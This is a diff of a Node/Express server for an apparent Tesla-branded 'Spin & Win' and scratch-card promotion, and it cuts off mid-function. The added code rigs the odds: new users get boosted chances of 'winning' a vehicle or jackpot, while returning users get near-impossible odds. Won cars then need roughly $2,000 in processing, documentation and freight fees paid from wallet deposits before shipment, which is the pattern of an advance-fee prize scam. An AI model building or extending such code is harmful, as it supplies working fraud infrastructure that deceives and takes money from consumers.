@@ -20,6 +20,7 @@ import {
   sendDepositNotificationEmail,
   sendMaturityNotificationEmail,
   sendBulkNewsletterEmail,
+  sendWonVehicleShipmentNotificationEmail,
   getDispatchedEmailLogs,
   getEffectiveSmtpSummary,
 } from './src/server/mailer.ts';
@@ -1104,6 +1105,44 @@ app.post('/api/notifications/deposit', authenticateToken, async (req, res) => {
   }
 });
 
+// Server-side Dashboard Notifications (persisted & delivered across sessions)
+app.get('/api/notifications', authenticateToken, (req, res) => {
+  const caller = (req as any).user;
+  const cleanEmail = caller?.email ? String(caller.email).trim().toLowerCase() : '';
+  const isAdmin = caller?.role === 'admin';
+  const isAlexAlias = caller?.id === 'usr-alex-001' || caller?.id === 'usr-apex-001';
+
+  const notifications = serverUserNotifications.filter((n) => {
+    if (!n) return false;
+    if (isAdmin) return true;
+    if (n.targetType === 'all') return true;
+    if (n.targetUserId && n.targetUserId === caller?.id) return true;
+    if (cleanEmail && n.targetUserEmail && String(n.targetUserEmail).trim().toLowerCase() === cleanEmail) return true;
+    if (isAlexAlias && (n.targetUserId === 'usr-alex-001' || n.targetUserId === 'usr-apex-001')) return true;
+    return false;
+  });
+
+  return res.json({ success: true, notifications });
+});
+
+app.post('/api/notifications/:id/read', authenticateToken, (req, res) => {
+  const caller = (req as any).user;
+  const { id } = req.params;
+  const uid = caller?.id;
+  if (!uid) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  const target = serverUserNotifications.find((n) => n && n.id === id);
+  if (target) {
+    const existingReadBy = Array.isArray(target.readBy) ? target.readBy : [];
+    if (!existingReadBy.includes(uid)) {
+      target.readBy = [...existingReadBy, uid];
+      persistServerGameAndCronState();
+    }
+  }
+  return res.json({ success: true });
+});
+
 // Automated Maturity Email Dispatcher (delegates to shared .env SMTP mailer utility)
 async function dispatchMaturityEmail(params: {
   toEmail: string;
@@ -1229,6 +1268,9 @@ const DEFAULT_SERVER_SPIN_SYSTEM_CONFIG = {
     activeOfferSpinsRemaining?: number;
     redeemedCouponCodes?: string[];
     welcomeSpinsGranted?: boolean;
+    scratchPlaysCount?: number;
+    scratchJackpotsWonCount?: number;
+    lastScratchAt?: string;
     lastSpinAt?: string;
     lastResolvedLevel?: 'easy' | 'hard' | 'super_hard';
     lastReason?: string;
@@ -1444,8 +1486,9 @@ let serverScratchTiers: any[] = (() => {
 })();
 
 const serverWonPrizes: Map<string, any> = new Map();
+const serverUserNotifications: any[] = [];
 
-// Hydrate persisted deposit records, transaction audits & won prizes on boot
+// Hydrate persisted deposit records, transaction audits, notifications & won prizes on boot
 (() => {
   try {
     const file = path.join(process.cwd(), '.apex_admin_state.json');
@@ -1455,9 +1498,39 @@ const serverWonPrizes: Map<string, any> = new Map();
         depositRecords: raw.depositRecords,
         transactionAudits: raw.transactionAudits,
       });
+      if (Array.isArray(raw.userNotifications)) {
+        for (const n of raw.userNotifications) {
+          if (n && n.id) {
+            serverUserNotifications.push(n);
+          }
+        }
+      }
       if (Array.isArray(raw.wonPrizesList)) {
         for (const wp of raw.wonPrizesList) {
-          if (wp && wp.id) serverWonPrizes.set(wp.id, wp);
+          if (wp && wp.id) {
+            const st = wp.shippingStatus || 'awaiting_details';
+            const isApprovedByStatus =
+              st === 'approved' || st === 'documentation_ready' || st === 'shipped' || st === 'delivered';
+            serverWonPrizes.set(wp.id, {
+              prizeType: 'vehicle',
+              title: '2026 Tesla Promotional Vehicle',
+              userName: wp.userId || 'Apex Member',
+              userEmail: 'member@apex-tesla.io',
+              image: '/promo-plaid.jpg',
+              estimatedValueUsd: 42490,
+              processingFeeUsd: 450,
+              shippingDocFeeUsd: 350,
+              shippingFreightFeeUsd: 1200,
+              totalFeesUsd: 2000,
+              wonAt: wp.paidAt ? String(wp.paidAt).slice(0, 10) : getUtcDateKey(),
+              source: 'Wheel Spin',
+              shippingStatus: st,
+              addressConfirmed: wp.addressConfirmed ?? Boolean(wp.shippingAddress?.street),
+              paymentVerifiedByAdmin: wp.paymentVerifiedByAdmin ?? isApprovedByStatus,
+              adminApprovedForShipment: wp.adminApprovedForShipment ?? isApprovedByStatus,
+              ...wp,
+            });
+          }
         }
       }
       if (raw.serverWalletsFreeWin && typeof raw.serverWalletsFreeWin === 'object') {
@@ -1494,6 +1567,7 @@ function persistServerGameAndCronState() {
       transactionAudits: validatorExport.transactionAudits,
       serverWalletsFreeWin,
       wonPrizesList: Array.from(serverWonPrizes.values()).slice(0, 100),
+      userNotifications: serverUserNotifications.slice(0, 200),
       updatedAt: new Date().toISOString(),
     };
     fs.writeFileSync(file, JSON.stringify(next, null, 2), 'utf-8');
@@ -1562,18 +1636,15 @@ function runSpinCriteriaAuditJob(): { flaggedUsers: number; summary: string } {
 function runWonPrizeLogisticsJob(): { advancedCount: number; summary: string } {
   let advancedCount = 0;
   for (const prize of serverWonPrizes.values()) {
-    if (!prize || !prize.feesPaid) continue;
-    if (prize.shippingStatus === 'fees_paid_processing') {
-      prize.shippingStatus = 'documentation_ready';
-      prize.trackingNumber = prize.trackingNumber || `APX-VIN-${Math.floor(100000 + Math.random() * 899999)}`;
-      prize.carrierName = prize.carrierName || 'Apex Enclosed EV Carrier Fleet';
-      advancedCount++;
-    } else if (prize.shippingStatus === 'documentation_ready') {
+    if (!prize || !prize.feesPaid || !prize.paymentVerifiedByAdmin || !prize.adminApprovedForShipment) continue;
+    if (prize.shippingStatus === 'documentation_ready') {
       prize.shippingStatus = 'shipped';
+      prize.trackingNumber = prize.trackingNumber || `APX-EXP-${Date.now().toString(36).toUpperCase()}`;
+      prize.carrierName = prize.carrierName || 'Apex Bonded Enclosed EV Carrier';
       advancedCount++;
     }
   }
-  const summary = `Verified ${serverWonPrizes.size} won-prize vault item(s); progressed shipping logistics on ${advancedCount} deposit-cleared vehicle(s).`;
+  const summary = `Verified ${serverWonPrizes.size} won-prize vault item(s); progressed shipping logistics on ${advancedCount} admin-approved vehicle(s).`;
   return { advancedCount, summary };
 }
 
@@ -2081,31 +2152,94 @@ app.post('/api/streak/admin-update', authenticateToken, requireAdmin, (req, res)
 // ============================================================================
 // SPIN & WIN DIFFICULTY, COUPONS, SCRATCH & WON VEHICLE DEPOSIT-ONLY FEES
 // ============================================================================
+const SEEDED_VETERAN_USER_IDS = new Set([
+  'usr-apex-001',
+  'usr-alex-001',
+  'usr-apex-admin-01',
+  'usr-003',
+  'usr-004',
+  'usr-005',
+  'usr-006',
+  'usr-007',
+  'usr-008',
+  'usr-009',
+  'usr-010',
+]);
+
+function getUserWonVehicles(userId: string, userEmail?: string) {
+  const cleanEmail = userEmail ? String(userEmail).trim().toLowerCase() : '';
+  const isAlexAlias = userId === 'usr-alex-001' || userId === 'usr-apex-001';
+  return Array.from(serverWonPrizes.values()).filter((p) => {
+    if (!p || p.prizeType !== 'vehicle') return false;
+    if (p.userId === userId) return true;
+    if (cleanEmail && p.userEmail && String(p.userEmail).trim().toLowerCase() === cleanEmail) return true;
+    if (isAlexAlias && (p.userId === 'usr-alex-001' || p.userId === 'usr-apex-001')) return true;
+    return false;
+  });
+}
+
+function getUserPromotionProfile(userId: string, userEmail?: string) {
+  const isSeededVeteran = SEEDED_VETERAN_USER_IDS.has(userId);
+  const tracker = serverSpinSystemConfig.userTrackers?.[userId];
+  const wonVehicles = getUserWonVehicles(userId, userEmail);
+  const paidSpinsCount = Number(tracker?.paidSpinsCount || 0);
+  const scratchPlaysCount = Number(tracker?.scratchPlaysCount || 0);
+  const scratchJackpotsWonCount = Number(tracker?.scratchJackpotsWonCount || 0);
+
+  // First-time users on free/coupon spins (before any paid spins or vehicle win) get boosted easy vehicle odds
+  const isNewUserForFreeSpin = !isSeededVeteran && wonVehicles.length === 0 && paidSpinsCount === 0;
+  // New users on scratch cards get easier jackpot/vehicle odds on their early cards; old users get rare/super-hard odds
+  const isNewUserForScratch = !isSeededVeteran && scratchPlaysCount < 3 && scratchJackpotsWonCount === 0;
+
+  return {
+    isSeededVeteran,
+    isNewUserForFreeSpin,
+    isNewUserForScratch,
+    wonVehiclesCount: wonVehicles.length,
+    paidSpinsCount,
+    scratchPlaysCount,
+    scratchJackpotsWonCount,
+  };
+}
+
 function computeSpinStakeProfile(
   spinCostUsd: number,
   minCost = 150,
   maxCost = 2500,
   maxJackpotUsd = 25000,
-  usingFree = false
+  usingFree = false,
+  isNewUserFreeSpinBoost = false
 ) {
   const effectiveMin = Math.max(150, minCost);
   const effectiveMax = Math.max(effectiveMin + 100, Math.min(2500, maxCost));
   const minStakeCap = Math.min(2000, Number(serverSpinSystemConfig.minStakeCashCapUsd) || 2000);
   const maxJackpot = Math.min(25000, Math.max(5000, maxJackpotUsd || 25000));
   const stake = usingFree ? 0 : Math.min(effectiveMax, Math.max(effectiveMin, Number(spinCostUsd) || effectiveMin));
-  const isMinOrFree = usingFree || stake <= effectiveMin;
-  const stakeRatio = isMinOrFree ? 0 : Math.min(1, Math.max(0, (stake - effectiveMin) / Math.max(1, effectiveMax - effectiveMin)));
+  const isMinStake = !usingFree && stake <= effectiveMin;
   const isMaxStake = !usingFree && stake >= effectiveMax;
+  const isNewFreeBoost = Boolean(usingFree && isNewUserFreeSpinBoost);
+  const isMinOrFree = isMinStake || (Boolean(usingFree) && !isNewFreeBoost);
+  const stakeRatio = isMinOrFree
+    ? 0
+    : isNewFreeBoost
+    ? 1
+    : Math.min(1, Math.max(0, (stake - effectiveMin) / Math.max(1, effectiveMax - effectiveMin)));
+
+  // Min stake ($150) & returning free spins cap strictly at <= $2,000; intermediate < $2,500 caps below max jackpot; ONLY max stake ($2,500) & new-user free spins unlock vehicles + $25k jackpot
   const maxAllowedCashUsd = isMinOrFree
     ? minStakeCap
-    : isMaxStake
+    : isMaxStake || isNewFreeBoost
     ? maxJackpot
-    : Math.min(maxJackpot - 500, Math.round((minStakeCap + Math.pow(stakeRatio, 1.05) * (maxJackpot - minStakeCap - 1000)) / 100) * 100);
-  const canWinVehicleByStake = !isMinOrFree && stake > effectiveMin;
-  const canWinJackpotByStake = isMaxStake;
-  const vehicleWeightMultiplier = !canWinVehicleByStake ? 0 : Number((0.4 + stakeRatio * 3.6).toFixed(2));
+    : Math.min(
+        maxJackpot - 1000,
+        Math.round((minStakeCap + Math.pow(stakeRatio, 1.05) * (maxJackpot - minStakeCap - 2000)) / 100) * 100
+      );
+
+  const canWinVehicleByStake = isMaxStake || isNewFreeBoost;
+  const canWinJackpotByStake = isMaxStake || isNewFreeBoost;
+  const vehicleWeightMultiplier = !canWinVehicleByStake ? 0 : isNewFreeBoost ? 4.5 : 4.0;
   const winBoostMultiplier = Number((1 + stakeRatio * 2.2).toFixed(2));
-  const tryAgainScale = Number((isMinOrFree ? 1.15 : Math.max(0.35, 1 - stakeRatio * 0.6)).toFixed(2));
+  const tryAgainScale = Number((isNewFreeBoost ? 0.4 : isMinOrFree ? 1.15 : Math.max(0.35, 1 - stakeRatio * 0.6)).toFixed(2));
 
   return {
     stakeUsd: stake,
@@ -2114,6 +2248,7 @@ function computeSpinStakeProfile(
     stakeRatio,
     isMinOrFree,
     isMaxStake,
+    isNewUserFreeSpinBoost: isNewFreeBoost,
     maxAllowedCashUsd,
     maxJackpotUsd: maxJackpot,
     canWinVehicleByStake,
@@ -2124,10 +2259,8 @@ function computeSpinStakeProfile(
   };
 }
 
-function checkUserVehicleWinEligibility(userId: string) {
-  const userVehicles = Array.from(serverWonPrizes.values()).filter(
-    (p) => p && p.userId === userId && p.prizeType === 'vehicle'
-  );
+function checkUserVehicleWinEligibility(userId: string, userEmail?: string) {
+  const userVehicles = getUserWonVehicles(userId, userEmail);
 
   // 1. Any prior won vehicle must be paid, processed, AND shipped/delivered before winning another
   const unfulfilled = userVehicles.find(
@@ -2185,22 +2318,38 @@ function checkUserVehicleWinEligibility(userId: string) {
     reasonCode: 'ELIGIBLE' as const,
     blockingPrize: null,
     nextEligibleAtIso: null,
-    message: 'Eligible to win 1 Tesla vehicle this week (when stake > $150 on spins or via scratch tiers).',
+    message: 'Eligible to win 1 Tesla vehicle this week (at $2,500 Max Spin Stake, New Member Free Spins, or Scratch Cards).',
   };
 }
 
 app.get('/api/promotions/vehicle-eligibility', authenticateToken, (req, res) => {
   const caller = (req as any).user;
   const userId = caller?.role === 'admin' && typeof req.query.userId === 'string' ? req.query.userId : caller?.id;
+  const userEmail = caller?.role === 'admin' && typeof req.query.userId === 'string' ? undefined : caller?.email;
   if (!userId) return res.status(401).json({ error: 'Authentication required' });
-  return res.json({ success: true, ...checkUserVehicleWinEligibility(userId) });
+  return res.json({
+    success: true,
+    ...checkUserVehicleWinEligibility(userId, userEmail),
+    promoProfile: getUserPromotionProfile(userId, userEmail),
+  });
 });
 
 app.get('/api/promotions/spin-config', (req, res) => {
   const caller = getAuthenticatedUser(req);
-  const vehicleEligibility = caller?.id ? checkUserVehicleWinEligibility(caller.id) : null;
+  const vehicleEligibility = caller?.id ? checkUserVehicleWinEligibility(caller.id, caller.email) : null;
+  const promoProfile = caller?.id
+    ? getUserPromotionProfile(caller.id, caller.email)
+    : {
+        isSeededVeteran: false,
+        isNewUserForFreeSpin: true,
+        isNewUserForScratch: true,
+        wonVehiclesCount: 0,
+        paidSpinsCount: 0,
+        scratchPlaysCount: 0,
+        scratchJackpotsWonCount: 0,
+      };
   if (caller?.role === 'admin') {
-    return res.json({ success: true, config: serverSpinSystemConfig, vehicleEligibility });
+    return res.json({ success: true, config: serverSpinSystemConfig, vehicleEligibility, promoProfile });
   }
   const safeUserTrackers = caller?.id && serverSpinSystemConfig.userTrackers?.[caller.id]
     ? { [caller.id]: serverSpinSystemConfig.userTrackers[caller.id] }
@@ -2216,6 +2365,7 @@ app.get('/api/promotions/spin-config', (req, res) => {
       userLevelOverrides: safeUserOverrides,
     },
     vehicleEligibility,
+    promoProfile,
   });
 });
 
@@ -2408,8 +2558,17 @@ app.post('/api/promotions/spin', authenticateToken, requireSelfOrAdmin, (req, re
   }
 
   const usingFree = wantFree && (tracker.activeOfferSpinsRemaining || 0) > 0;
-  const stakeProfile = computeSpinStakeProfile(effectiveCost, minCost, maxCost, maxCashWin, usingFree);
-  const vehicleEligibility = checkUserVehicleWinEligibility(userId);
+  const promoProfileBefore = getUserPromotionProfile(userId, userEmail);
+  const vehicleEligibility = checkUserVehicleWinEligibility(userId, userEmail);
+  const isNewFreeSpinBoost = usingFree && promoProfileBefore.isNewUserForFreeSpin && vehicleEligibility.eligible;
+  const stakeProfile = computeSpinStakeProfile(
+    effectiveCost,
+    minCost,
+    maxCost,
+    maxCashWin,
+    usingFree,
+    isNewFreeSpinBoost
+  );
 
   let spinPaymentAudit: any = null;
   if (!usingFree) {
@@ -2460,8 +2619,14 @@ app.post('/api/promotions/spin', authenticateToken, requireSelfOrAdmin, (req, re
   const multiWinThreshold = Math.max(1, Number(serverSpinSystemConfig.autoSuperHardWinThreshold) || 2);
 
   if (usingFree) {
-    resolvedLevel = 'super_hard';
-    reason = 'free_spin_bonus_super_hard';
+    if (isNewFreeSpinBoost) {
+      // First-time users with welcome/coupon free spins play on Easy with high Tesla vehicle odds
+      resolvedLevel = 'easy';
+      reason = 'new_user_free_spin_easy_boost';
+    } else {
+      resolvedLevel = 'super_hard';
+      reason = 'free_spin_bonus_super_hard';
+    }
   } else if (userOverride && userOverride !== 'auto') {
     resolvedLevel = userOverride;
     reason = `admin_user_override_${userOverride}`;
@@ -2480,47 +2645,59 @@ app.post('/api/promotions/spin', authenticateToken, requireSelfOrAdmin, (req, re
   const activeSlices = levelSlices.filter((s) => s && s.isActive !== false);
   const sourceSlices = activeSlices.length > 0 ? activeSlices : levelSlices;
 
-  // Apply stake-based scaling + strict minimum ($150) & vehicle eligibility gating
+  // Apply strict stake gating: vehicles & max jackpots ONLY on max spin cost ($2,500) OR new users having free spins
   const canWinVehicle = stakeProfile.canWinVehicleByStake && vehicleEligibility.eligible;
   const weightedCandidates = sourceSlices.map((s) => {
     const baseWeight = Math.max(1, Number(s.probabilityWeight ?? s.weight) || 1);
     const rawVal = Number(s.valueUsd ?? s.value ?? 0);
 
     if (s.type === 'car') {
+      if (!canWinVehicle) {
+        return { ...s, weight: 0, probabilityWeight: 0 };
+      }
+      const carW = isNewFreeSpinBoost
+        ? Math.max(baseWeight * 5, 22)
+        : Math.max(1, Math.round(baseWeight * stakeProfile.vehicleWeightMultiplier));
       return {
         ...s,
-        weight: canWinVehicle ? Math.max(1, Math.round(baseWeight * stakeProfile.vehicleWeightMultiplier)) : 0,
-        probabilityWeight: canWinVehicle ? Math.max(1, Math.round(baseWeight * stakeProfile.vehicleWeightMultiplier)) : 0,
+        weight: carW,
+        probabilityWeight: carW,
       };
     }
     if (s.type === 'try_again') {
-      const tw = Math.max(1, Math.round(baseWeight * stakeProfile.tryAgainScale));
+      const tw = isNewFreeSpinBoost
+        ? Math.max(1, Math.round(baseWeight * 0.4))
+        : Math.max(1, Math.round(baseWeight * stakeProfile.tryAgainScale));
       return { ...s, weight: tw, probabilityWeight: tw };
     }
     // Cash/crypto/credits prize
     if (stakeProfile.isMinOrFree) {
-      // At minimum $150 cost or free spins, cannot win jackpot or above $2,000
+      // At minimum $150 cost or returning free spins, cannot win jackpot or above $2,000
       if (rawVal > stakeProfile.maxAllowedCashUsd || rawVal >= 10000) {
         return { ...s, weight: 0, probabilityWeight: 0 };
       }
       return { ...s, weight: baseWeight, probabilityWeight: baseWeight };
     }
 
-    // Paid stake > minCost: unlock progressively higher cash tiers & scale jackpot up to $25,000 on max stake
-    const isLevelTopCash = rawVal >= 8000;
-    let effectiveSliceVal = rawVal;
-    if (stakeProfile.isMaxStake && isLevelTopCash && rawVal >= 15000) {
-      effectiveSliceVal = stakeProfile.maxJackpotUsd; // Full $25,000 jackpot unlocked at max $2,500 spin cost
-    } else if (rawVal > stakeProfile.maxAllowedCashUsd) {
-      // Higher tier jackpot slices locked below required stake
+    // Paid intermediate ($151–$2,499) vs Max Stake ($2,500) / New-user Free Spin
+    const isJackpotTier = rawVal >= 15000;
+    if (!stakeProfile.canWinJackpotByStake && isJackpotTier) {
       return { ...s, weight: 0, probabilityWeight: 0 };
-    } else if (stakeProfile.stakeRatio > 0 && !isLevelTopCash) {
-      // Scale mid/low cash wins proportionally with selected stake (strictly capped by maxAllowedCashUsd)
+    }
+
+    let effectiveSliceVal = rawVal;
+    if (stakeProfile.canWinJackpotByStake && isJackpotTier) {
+      effectiveSliceVal = stakeProfile.maxJackpotUsd; // Full $25,000 jackpot unlocked at max $2,500 spin cost or new-user free spin
+    } else if (rawVal > stakeProfile.maxAllowedCashUsd) {
+      return { ...s, weight: 0, probabilityWeight: 0 };
+    } else if (stakeProfile.stakeRatio > 0 && rawVal < 8000) {
       const scaled = Math.round((rawVal * (1 + stakeProfile.stakeRatio * 1.15)) / 50) * 50;
       effectiveSliceVal = Math.min(stakeProfile.maxAllowedCashUsd, Math.max(rawVal, scaled));
     }
 
-    const boostFactor = 1 + stakeProfile.stakeRatio * (effectiveSliceVal >= 10000 ? 2.4 : 1.6);
+    const boostFactor = isNewFreeSpinBoost
+      ? 1.1
+      : 1 + stakeProfile.stakeRatio * (effectiveSliceVal >= 10000 ? 2.4 : 1.6);
     const nw = Math.max(1, Math.round(baseWeight * boostFactor));
     return {
       ...s,
@@ -2538,7 +2715,8 @@ app.post('/api/promotions/spin', authenticateToken, requireSelfOrAdmin, (req, re
       : sourceSlices.find((s) => s.type === 'try_again') || sourceSlices[0];
 
   const maxFreeWins = Math.max(1, Number(serverSpinSystemConfig.freeSpinMaxWinsPerOffer) || 1);
-  if (usingFree && tracker.freeSpinOfferWinsUsed >= maxFreeWins) {
+  // Returning/ineligible users on free spins remain capped at 1 win per offer; first-time users retain free/coupon spin eligibility until winning a vehicle
+  if (usingFree && !isNewFreeSpinBoost && tracker.freeSpinOfferWinsUsed >= maxFreeWins) {
     const tryAgainSlice = sourceSlices.find((s) => s.type === 'try_again') || {
       id: 'sh-cap-try',
       label: 'Try Again',
@@ -2588,7 +2766,7 @@ app.post('/api/promotions/spin', authenticateToken, requireSelfOrAdmin, (req, re
         totalFeesUsd: 2000,
         feesPaid: false,
         shippingStatus: 'awaiting_details',
-        notes: 'Won via Spin & Win Wheel. Processing, documentation & enclosed freight fees require active wallet deposits (free promotional wins excluded). Weekly 1-vehicle limit & fulfillment policy applies.',
+        notes: 'Won via Spin & Win Wheel. Fill in your destination shipping address and deposit processing, documentation & freight fees in Dashboard -> Won Prizes to schedule dispatch. Weekly 1-vehicle limit & prior fulfillment policy applies.',
       };
       serverWonPrizes.set(wonPrizeItem.id, wonPrizeItem);
     } else {
@@ -2604,13 +2782,14 @@ app.post('/api/promotions/spin', authenticateToken, requireSelfOrAdmin, (req, re
   tracker.lastResolvedLevel = resolvedLevel;
   tracker.lastReason = reason;
 
-  if ((tracker.totalWinsCount || 0) >= multiWinThreshold && (!userOverride || userOverride === 'auto')) {
+  if (!isNewFreeSpinBoost && (tracker.totalWinsCount || 0) >= multiWinThreshold && (!userOverride || userOverride === 'auto')) {
     serverSpinSystemConfig.userLevelOverrides[userId] = 'super_hard';
   }
 
   serverSpinSystemConfig.userTrackers = { ...trackers, [userId]: tracker };
   const reconciledWallet = reconcileWalletFromDepositRecords(userId, serverWallets);
-  const updatedVehicleEligibility = checkUserVehicleWinEligibility(userId);
+  const updatedVehicleEligibility = checkUserVehicleWinEligibility(userId, userEmail);
+  const updatedPromoProfile = getUserPromotionProfile(userId, userEmail);
   persistServerGameAndCronState();
 
   const signature = signLedgerPayload({
@@ -2627,9 +2806,11 @@ app.post('/api/promotions/spin', authenticateToken, requireSelfOrAdmin, (req, re
     resolvedLevel,
     reason,
     usedFreeSpin: usingFree,
+    isNewFreeSpinBoost,
     costChargedUsd: usingFree ? 0 : effectiveCost,
     stakeProfile,
     vehicleEligibility: updatedVehicleEligibility,
+    promoProfile: updatedPromoProfile,
     slice: { ...chosenSlice, valueUsd: chosenSlice.type === 'car' ? chosenSlice.valueUsd : awardedCashUsd || chosenSlice.valueUsd },
     awardedCashUsd,
     wonPrizeItem,
@@ -2704,33 +2885,61 @@ app.post('/api/promotions/scratch', authenticateToken, requireSelfOrAdmin, (req,
     });
   }
 
-  const vehicleEligibility = checkUserVehicleWinEligibility(userId);
+  const promoProfileBefore = getUserPromotionProfile(userId, userEmail);
+  const vehicleEligibility = checkUserVehicleWinEligibility(userId, userEmail);
+  const isNewScratchUser = promoProfileBefore.isNewUserForScratch;
   const rawPrizes: any[] = Array.isArray(authoritativeTier.possiblePrizes) ? authoritativeTier.possiblePrizes : [];
+  const jackpotThreshold = Math.max(400, (Number(authoritativeTier.maxPrizeUsd) || 1000) * 0.5);
 
-  // Enforce Super Hard / Rare jackpot weighting & strip Tesla vehicle outcomes when weekly/unshipped gate applies
+  // New users: easier jackpot & eligible Tesla car odds; Old/returning users: rare / super hard jackpots
   const filteredPrizes = rawPrizes
     .filter((p) => (vehicleEligibility.eligible ? true : !p.isTeslaCar))
     .map((p) => {
       const baseW = Math.max(1, Number(p.weight) || 1);
-      const isTopJackpot = !p.isTeslaCar && !p.isTryAgain && Number(p.amountUsd) >= (Number(authoritativeTier.maxPrizeUsd) || 1000) * 0.6;
-      if (p.isTeslaCar || isTopJackpot) {
-        // Keep jackpots & vehicles strictly rare (capped weight <= 3)
-        return { ...p, weight: Math.min(baseW, 3) };
+      const isTryAgain = Boolean(p.isTryAgain) || Number(p.amountUsd) <= 0;
+      const isTopJackpot = !p.isTeslaCar && !isTryAgain && Number(p.amountUsd) >= jackpotThreshold;
+
+      if (isNewScratchUser) {
+        if (p.isTeslaCar && vehicleEligibility.eligible) {
+          return { ...p, weight: Math.max(baseW * 6, 18) };
+        }
+        if (isTopJackpot) {
+          return { ...p, weight: Math.max(baseW * 8, 25) };
+        }
+        if (isTryAgain) {
+          return { ...p, weight: Math.min(baseW, 25) };
+        }
+        return { ...p, weight: Math.max(baseW, 12) };
       }
-      if (p.isTryAgain || Number(p.amountUsd) <= 0) {
-        // Super-hard baseline weight
-        return { ...p, weight: Math.max(baseW, 120) };
+
+      // Old / returning users: rare / super hard jackpot & car odds
+      if (p.isTeslaCar || isTopJackpot) {
+        return { ...p, weight: Math.min(baseW, 1) };
+      }
+      if (isTryAgain) {
+        return { ...p, weight: Math.max(baseW, 280) };
       }
       return { ...p, weight: baseW };
     });
 
   const hasTryAgain = filteredPrizes.some((p) => p.isTryAgain || Number(p.amountUsd) <= 0);
   if (!hasTryAgain) {
-    filteredPrizes.push({ amountUsd: 0, label: 'Try Again ($0)', weight: 220, isTryAgain: true });
+    filteredPrizes.push({
+      amountUsd: 0,
+      label: 'Try Again ($0)',
+      weight: isNewScratchUser ? 25 : 340,
+      isTryAgain: true,
+    });
   }
 
   const chosen = pickWeightedSlice(filteredPrizes);
   const isCar = Boolean(chosen.isTeslaCar) && vehicleEligibility.eligible;
+  const isTopJackpotHit =
+    isCar ||
+    (!chosen.isTryAgain &&
+      Number(chosen.amountUsd) > 0 &&
+      Number(chosen.amountUsd) >= jackpotThreshold);
+
   let awardedCashUsd = 0;
   let wonPrizeItem: any = null;
 
@@ -2760,7 +2969,7 @@ app.post('/api/promotions/scratch', authenticateToken, requireSelfOrAdmin, (req,
       totalFeesUsd: isLowerVersion ? 1780 : 2580,
       feesPaid: false,
       shippingStatus: 'awaiting_details',
-      notes: `Won 1 Tesla Vehicle from ${authoritativeTier.name}. Processing, documentation & shipping costs must be funded from active wallet deposits (free cash wins cannot be applied). Weekly 1-vehicle limit & fulfillment policy applies.`,
+      notes: `Won 1 Tesla Vehicle from ${authoritativeTier.name}. Fill in your shipping address and pay processing, documentation & freight fees from verified wallet deposits in Dashboard -> Won Prizes before another vehicle can be won.`,
     };
     serverWonPrizes.set(wonPrizeItem.id, wonPrizeItem);
   } else {
@@ -2776,8 +2985,29 @@ app.post('/api/promotions/scratch', authenticateToken, requireSelfOrAdmin, (req,
     }
   }
 
+  // Update server scratch play/jackpot tracker
+  const trackers = serverSpinSystemConfig.userTrackers || {};
+  const prevTracker = trackers[userId] || {
+    paidSpinsCount: 0,
+    totalWinsCount: 0,
+    freeSpinOfferWinsUsed: 0,
+    freeSpinOffersRedeemed: 0,
+    activeOfferSpinsRemaining: 0,
+    redeemedCouponCodes: [],
+    scratchPlaysCount: 0,
+    scratchJackpotsWonCount: 0,
+  };
+  const nextTracker = {
+    ...prevTracker,
+    scratchPlaysCount: (prevTracker.scratchPlaysCount || 0) + 1,
+    scratchJackpotsWonCount: (prevTracker.scratchJackpotsWonCount || 0) + (isTopJackpotHit ? 1 : 0),
+    lastScratchAt: new Date().toISOString(),
+  };
+  serverSpinSystemConfig.userTrackers = { ...trackers, [userId]: nextTracker };
+
   const finalWallet = reconcileWalletFromDepositRecords(userId, serverWallets);
-  const updatedVehicleEligibility = checkUserVehicleWinEligibility(userId);
+  const updatedVehicleEligibility = checkUserVehicleWinEligibility(userId, userEmail);
+  const updatedPromoProfile = getUserPromotionProfile(userId, userEmail);
   const ticketId = `SCR-${Date.now().toString(36).toUpperCase()}-${crypto.randomBytes(2).toString('hex').toUpperCase()}`;
   const signature = signValidationPayload({
     ticketId,
@@ -2796,6 +3026,9 @@ app.post('/api/promotions/scratch', authenticateToken, requireSelfOrAdmin, (req,
     prize: chosen,
     awardedCashUsd,
     wonPrizeItem,
+    isNewScratchUser,
+    tracker: nextTracker,
+    promoProfile: updatedPromoProfile,
     vehicleEligibility: updatedVehicleEligibility,
     wallet: finalWallet,
     audit: validation.audit,
@@ -2806,7 +3039,18 @@ app.post('/api/promotions/scratch', authenticateToken, requireSelfOrAdmin, (req,
 app.get('/api/won-prizes', authenticateToken, (req, res) => {
   const caller = (req as any).user;
   const all = Array.from(serverWonPrizes.values());
-  const prizes = caller?.role === 'admin' ? all : all.filter((p) => p.userId === caller?.id);
+  if (caller?.role === 'admin') {
+    return res.json({ success: true, prizes: all });
+  }
+  const cleanEmail = caller?.email ? String(caller.email).trim().toLowerCase() : '';
+  const isAlexAlias = caller?.id === 'usr-alex-001' || caller?.id === 'usr-apex-001';
+  const prizes = all.filter((p) => {
+    if (!p) return false;
+    if (p.userId === caller?.id) return true;
+    if (cleanEmail && p.userEmail && String(p.userEmail).trim().toLowerCase() === cleanEmail) return true;
+    if (isAlexAlias && (p.userId === 'usr-alex-001' || p.userId === 'usr-apex-001')) return true;
+    return false;
+  });
   return res.json({ success: true, prizes });
 });
 
@@ -2823,6 +3067,7 @@ app.post('/api/won-prizes', authenticateToken, requireAdmin, (req, res) => {
     ...payload,
     id,
     wonAt: payload.wonAt || getUtcDateKey(),
+    wonAtIso: payload.wonAtIso || new Date().toISOString(),
     processingFeeUsd: p,
     shippingDocFeeUsd: d,
     shippingFreightFeeUsd: f,
@@ -2835,28 +3080,355 @@ app.post('/api/won-prizes', authenticateToken, requireAdmin, (req, res) => {
   return res.json({ success: true, prize: created });
 });
 
-app.put('/api/won-prizes/:id', authenticateToken, requireAdmin, (req, res) => {
+function formatWonPrizeStatusLabel(status: string): string {
+  switch (status) {
+    case 'approved':
+      return 'Approved';
+    case 'documentation_ready':
+      return 'Export Documentation Ready';
+    case 'shipped':
+      return 'Shipped / In Transit';
+    case 'delivered':
+      return 'Delivered';
+    case 'fees_paid_processing':
+      return 'Fees Paid & Processing';
+    default:
+      return 'Awaiting Details';
+  }
+}
+
+async function triggerWonPrizeShipmentNotifications(params: {
+  existing: any;
+  updated: any;
+  callerEmail?: string;
+  note?: string;
+}) {
+  const { existing, updated, callerEmail, note } = params;
+  const statusChanged = existing.shippingStatus !== updated.shippingStatus;
+  const approvalChanged =
+    Boolean(existing.adminApprovedForShipment) !== Boolean(updated.adminApprovedForShipment);
+  const paymentVerificationChanged =
